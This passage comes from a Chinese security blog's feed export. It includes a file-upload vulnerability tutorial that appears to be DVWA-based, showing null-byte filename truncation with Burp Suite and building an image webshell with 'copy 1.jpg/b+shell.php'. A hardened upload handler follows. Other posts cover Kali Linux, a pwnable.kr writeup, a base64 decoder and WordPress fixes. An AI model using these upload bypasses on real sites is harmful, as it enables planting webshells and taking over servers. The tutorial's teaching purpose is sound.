invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br><span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><span class="hljs-comment">//识别文件后缀</span><br><span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpeg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;png&quot;</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br><span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;图片上传识别.&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> 图片上传成功!&lt;/pre&gt;&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;只能上传格式为jpg和png的图片.&lt;/pre&gt;&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>相比较于前一种比价简单的验证content-type的防护方式，一般级别的防护措施换成了验证文件后缀的方式，顺便多说一句，在为了安全性设置一些限制时，使用白名单永远比设置黑名单要安全的多，因为总会有&#x3D;各种方式绕过黑名单的方式或者是一些针对不同服务器系统或着服务器的特殊解析原理而造成的一些安全隐患。以下是获取文件后缀的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>通过本语句获取文件名中最后一个“.”后的字符识别上传的文件名的后缀，并将后缀存储在一个变量中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpeg&quot;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;png&quot;</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br><span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) )<br></code></pre></td></tr></table></figure><p>而在if的逻辑判断中，需要上一条语句截取到的文件后缀为“jpg”，“jpeg”或者“png”，切且上传的文件大小不得大于10000b，如果只有这个限制方法的话，可以直接使用burpsuite进行00截断，从而使得在文件后缀验证时通过但是在文件转储的时候忽略掉00之后的内容从而实现后缀欺骗，具体方式如下：</p><ul><li>假设网站只能上传图片文件并在后台欧了后缀的限制</li><li>此时你要上传一个shell.php的一句话木马</li><li>将”shell.php”改为”shell.php 1.png”</li><li>使用burpsuite截断代理，拦截数据包</li><li>将”shell.php 1.png”发送至decoder模块，从text模式转换为hex编辑模式，找到”shell.php 1.png”中空格对应的hex值“20”，将20改为00</li><li>从hex模式恢复为text并将修改过的字符串替换原来报文中的”shell.php 1.png”</li><li>发送报文，操作成功后会显示文件上传成功</li></ul><p>操作成功后会显示文件上传成功，在php版本小于5.3.4的版本中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名a1.php%00.png进行绕过，我们用bp抓包检测一下文件类型。 可以发现文件类型是png成功绕过前端，并且到服务器文件会被解析成php文件，因为00后面的被截断了，服务器不解析。</p><p>但是在本例中，00截断的方法不再有效，因为if条件中还有一个getimagesize()函数，此函数会自动识别上传的图片的文件头，长宽，mime类型等信息，因此如果上传的文件不是图片将无法上传。绕过这个限制的方法是制作图片马，我是在win环境下制作的，只需准备一个图片大小较小的jpg或者png格式的图片，打开cmd使用命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">copy</span> <span class="hljs-number">1</span>.jpg/b+shell.php <span class="hljs-number">2</span>.jpg<br></code></pre></td></tr></table></figure><p>来合成一张图片马，如果用二进制编辑器打开此文件会发现一句话木马写到了文件的后面，把这样的文件上传时，由于文件头仍然是jpg的文件头，getimagesize()函数也会正确的返回图片的大小和文类型，因此通这种方式可以绕过getimagesize()函数的限制，再结合00截断即可上传木马并在服务器端将文件解析为php脚本，从而正确执行。</p><p>但是如果服务器的PHP版本较高，则无法通过此方法进行漏洞的利用，需要结合文件包含漏洞进行利用。</p><h2 id="0x03-无解的防护-全方面限制"><a href="#0x03-无解的防护-全方面限制" class="headerlink" title="0x03  无解的防护-全方面限制"></a>0x03  无解的防护-全方面限制</h2><p>当然安全只是相对的，没有绝对的安全，一下代码对输入的文件进行了多种方式的审查并进行了重新编码，是目前比较完善了安全防御措施。</p><p><strong>源代码  upload_2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br><span class="hljs-comment">// 检查token</span><br><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br><span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br><span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br><span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><span class="hljs-variable">$target_path</span>   = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-variable">$target_file</span>   =  <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br><span class="hljs-variable">$temp_file</span>     = ( ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="hljs-string">&#x27;&#x27;</span> ) ? ( <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>() ) : ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) ) );<br><span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br><span class="hljs-comment">//判断是否是一张图片</span><br><span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpeg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span> ) &amp;&amp;<span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><span class="hljs-comment">//重新制作一张图片，抹去任何可能有危害的数据</span><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> ) &#123;<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br><span class="hljs-title function_ invoke__">imagejpeg</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br><span class="hljs-title function_ invoke__">imagepng</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">imagedestroy</span>( <span class="hljs-variable">$img</span> );<br><span class="hljs-comment">//文件转储</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$temp_file</span>, ( <span class="hljs-title function_ invoke__">getcwd</span>() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) &#123;<br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//删除所有暂时文件</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$temp_file</span> ) )<br><span class="hljs-title function_ invoke__">unlink</span>( <span class="hljs-variable">$temp_file</span> );<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//无效文件</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 添加抗csrf验证</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>上述代码的安全措施：</strong></p><ul><li>添加了sessionToken，验证会话身份，用于防止csrf攻击</li><li>使用md5( uniqid() . $uploaded_name )函数，uniqid()函数是根据当前的时间，生成一个唯一的id，跟大多数随机函数一样，基于时间的随机函数在一定条件下也是可以差生碰撞的，因此本例中采用了md5()函数来保证生成id的唯一性，而且由于md5()函数对上传的文件名进行了重命名，因此无法使用00截断的方式来上传php或者其他恶意脚本文件。</li><li>以白名单的方式限制上传的文件后缀</li><li>限定上传的文件大小不得超过10000</li><li>通过imagecreatefromjpeg()和imagecreatefrompng()函数将上传的图片文件重新写入到一个新的图片文件中，这两个函数会自动将图片中的有害元数据抹除，因此即使黑客上传了一张图片马也会被这个函数过滤成一个纯正的图片。</li><li>imagedestroy( $img )将用户上传的源文件删除</li><li>unlink( $temp_file )删除过滤过程中产生的任何临时文件</li></ul><h2 id="0x04-个人总结"><a href="#0x04-个人总结" class="headerlink" title="0x04 个人总结"></a>0x04 个人总结</h2><p>web漏洞种类繁多，利用方法奇葩而有趣，值得研究和学习</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将Kali Linux作为主力系统是一种怎样的体验</title>
    <link href="/2018/09/%E5%B0%86Kali-Linux%E4%BD%9C%E4%B8%BA%E4%B8%BB%E5%8A%9B%E7%B3%BB%E7%BB%9F%E6%98%AF%E4%B8%80%E7%A7%8D%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/"/>
    <url>/2018/09/%E5%B0%86Kali-Linux%E4%BD%9C%E4%B8%BA%E4%B8%BB%E5%8A%9B%E7%B3%BB%E7%BB%9F%E6%98%AF%E4%B8%80%E7%A7%8D%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p>为了提高学习效率，我舍弃了在虚拟机里运行linux系统的方法，直接在笔记本上装了Kali Linux+Windows10双系统，使用的流畅度确实有了很大的提升，甚至用惯Linux后会嫌弃在Window下各种不合理的设定，确实在linux下使用一些软件或者配置环境要方便的多，由于系统是开源的，对系统进行个性化的定制也是十分方便的，bash命令也使我的工作效率有了极大的提升，但是Linux的稳定性确实十分差，在我心里有一个系统稳定性的排行榜：Macos&gt;Windows&gt;Linux，看来系统稳定性确实跟系统的封装度有一定的关系，在Windows下确实会经常碰到一些令人一头雾水的错误代码，Linux更是这样，在我安装双系统的时候，已经做好了经常折腾的心理准备，比如头一次对Kali安装显卡驱动，直接进不了系统，无奈只得重新安装系统，但是安装时却把grub给搞坏了，因此在我没有搞清楚grub的使用方法以及工作原理的时候，我都是在grub里面敲一些指令来开机的，浪费了很多的时间，后来将Kali装好之后，我一度沉迷在了Linux的世界中，喜欢上额这种简简洁明快的交互方式，虽然有一些win下常用的软件不能直接在linux上使用，但是可以通过wine这样的中间件来达成使用效果或者是在linux平台下寻找更合适的替代品，因此在很长一段时间内我都没有启动windows，除非是想玩游戏的时候，通常的情景是直接进入kali开始学习工作，偶尔打开在kali中安装的虚拟机来完成一些必须在win下完成的事情，这种情况持续了很长时间。因为kali2是rolling版本，所以系统需要频繁的更新，刚开始时我喜欢经常让系统保持在一个最新的状态，因此我没事的时候比如中午去吃饭就直接在终端内输入apt-update&amp;&amp;apt-upgrade使系统更新，偶尔的更新过程中会出现一些错误，比如更新完成后中文输入法无法正常工作等意外情况，或者是一些依赖的错误等等，我在这些由于更新而产生的错误上也填了很多的坑，花了时间也不少，因此我慢慢疲于做这样的工作，系统的错误为什么需要我花费大量的时间去修补，因此后来我就很久没有进行系统更新，直到今天，由于为了修复系统中可能出现的漏洞，我进行的系统更新，结果悲催了，更新过程中一直卡到了一个部分长达一个小时，更新总时间也要花去三个小时，卡在这里肯定是因为系统又出现了一些依赖的错误或者版本不匹配的情况，当我再次打开linux的时候，只见桌面一片黑暗，图标全无，docker也是空的，一些系统界面上的关键图标也消失不见，终端也无法打开，通过快捷键打开终端或者文件管理器的时候会自动注销，重新登陆后情况依旧。幸好我有很多的资料都保存在了云端，但是我长期的学习成果，有很多配置好的环境都得重新配置，因此十分不爽，我以后是绝对不会再把Linux作为主力系统来使用了，由于硬盘空间有限，也没有做全盘的备份，kali也没有自己的系统备份方案，而且系统的稳定性本来就差，三天两头出小毛病，真的是心累，或许linux还是更适合活在虚拟机里，备份的时候直接做一个快照，这样就能省去很多维护的时间。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>passcode_WriteUp(pwnable.kr_passcode)scanf函数不加&quot;&amp;&quot;带来的危险</title>
    <link href="/2018/09/passcode-WriteUp-pwnable-kr-passcode-scanf%E5%87%BD%E6%95%B0%E4%B8%8D%E5%8A%A0/"/>
    <url>/2018/09/passcode-WriteUp-pwnable-kr-passcode-scanf%E5%87%BD%E6%95%B0%E4%B8%8D%E5%8A%A0/</url>
    
    <content type="html"><![CDATA[<p>题目传送门：<a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a> </p><p><img src="https://i.loli.net/2018/09/29/5baee15cae7f3.png"></p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> passcode1;<br>    <span class="hljs-type">int</span> passcode2;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode1 : &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, passcode1);<br>    fflush(<span class="hljs-built_in">stdin</span>);<br>    <br>    <span class="hljs-comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter passcode2 : &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, passcode2);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;checking...\n&quot;</span>);<br>    <span class="hljs-keyword">if</span>(passcode1==<span class="hljs-number">338150</span> &amp;&amp; passcode2==<span class="hljs-number">13371337</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Login OK!\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Login Failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">welcome</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter you name : &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%100s&quot;</span>, name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome %s!\n&quot;</span>, name);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);<br><br>    welcome();<br>    login();<br>    <br>    <span class="hljs-comment">// something after login...</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><p>可以将源代码，可执行文件以<code>scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode.c passcode.c</code>下载到本地分析</p><p>另外，由于我在网上找到了有大佬写过这个，而且写的很全面，觉得自己无需再次搬砖，就把大佬的链接放在这里了：<a href="https://blog.csdn.net/smalosnail/article/details/53247502">https://blog.csdn.net/smalosnail/article/details/53247502</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python将base64转为文档或者图片</title>
    <link href="/2018/09/Python%E5%B0%86base64%E8%BD%AC%E4%B8%BA%E6%96%87%E6%A1%A3%E6%88%96%E8%80%85%E5%9B%BE%E7%89%87/"/>
    <url>/2018/09/Python%E5%B0%86base64%E8%BD%AC%E4%B8%BA%E6%96%87%E6%A1%A3%E6%88%96%E8%80%85%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>有时候使用在线的base64解码遇到一些大文件或者编码比较复杂的可能会出现一些问题，就写了个脚本来解决<br>gist地址：<a href="https://gist.github.com/Hvnt3r/dad413128496cea8b4e4f66757b8e8c3">https://gist.github.com/Hvnt3r/dad413128496cea8b4e4f66757b8e8c3</a></p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> 将base码转换为文件的脚本，可以解码图片</span><br><span class="hljs-string"> Author:Hvnt3r</span><br><span class="hljs-string"> Date:2018.8.22</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#import codecs #解码其他编码格式如GBK需要的模块</span><br><br>file_path=<span class="hljs-string">&quot;E:/TMP/Python_test/one/&quot;</span>   <span class="hljs-comment"># 定义文件所在的文件夹</span><br>raw_file_name=<span class="hljs-string">&quot;base64.txt&quot;</span>            <span class="hljs-comment"># 定义存放base64的文件名</span><br>decoded_file_name=<span class="hljs-string">&quot;decoded_file.doc&quot;</span>  <span class="hljs-comment"># 定义转换后的文件名，包括后缀</span><br><br>FILE_PATH=file_path+raw_file_name<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">base_to_file</span>(<span class="hljs-params">FILE</span>):<br>    base64String = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment">#1.从文件中读取base64并解码</span><br>    <span class="hljs-comment">#with codecs.open(FILE, &#x27;r&#x27;, &#x27;gbk&#x27;) as f:   # 读取其他编码的文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(FILE, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:   <span class="hljs-comment"># 将文件路径和文件名改成自己需要的</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file.readlines():  <span class="hljs-comment">#  去除每一行之后的换行符</span><br>            base64String += line.strip()<br><br>    <span class="hljs-comment">#2.从粘贴的字符串中解码</span><br>    <span class="hljs-comment">#raw_base64String = &quot;在这里粘贴待转换的base64字符串&quot;</span><br>    <span class="hljs-comment">#for line in raw_base64String.rstrip(&quot;\n&quot;):   # 去除每一行之后的换行符</span><br>    <span class="hljs-comment">#    base64String+=line.strip()</span><br><br>    <span class="hljs-comment">#写入文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(decoded_file_name, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(base64.b64decode(base64String))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;解码完毕&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    base_to_file(FILE_PATH)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WordPress一些配置问题</title>
    <link href="/2018/09/%C2%96WordPress%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    <url>/2018/09/%C2%96WordPress%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h3 id="WordPress的URL设置错误导致博客无法正常显示"><a href="#WordPress的URL设置错误导致博客无法正常显示" class="headerlink" title="WordPress的URL设置错误导致博客无法正常显示"></a>WordPress的URL设置错误导致博客无法正常显示</h3><p><strong>情景描述</strong></p><p>由于我的博客没有做正确的配置（在这里吐槽一下wordpress实在是太脆弱了，各种兼容性不友好），我的博客通过域名访问后会在地址栏变为我的服务器的IP地址，觉得这样十分不美观，于是就想自定义一下我的URL，百度之后发现这个可以直接在WP的设置中更改，但是我小手一抖，想改的URL还没打完就不小心按了回车键，结果博客立马就炸了，所有的资源链接都变成了我的那个不完整的链接，因此页面无法正常的完成加载，页面的响应速度也很慢，也无法正常登陆了，下面我来记录一下这个问题的解决办法。</p><span id="more"></span><p><strong>解决方法：</strong></p><p>这个问题需要修改数据库，首先用ssh连接上服务器，<code>cd</code>到WP的根目录</p><p>在终端内输入下列命令并输入密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -u root -p<br></code></pre></td></tr></table></figure><p>登陆后切换数据库:</p><figure 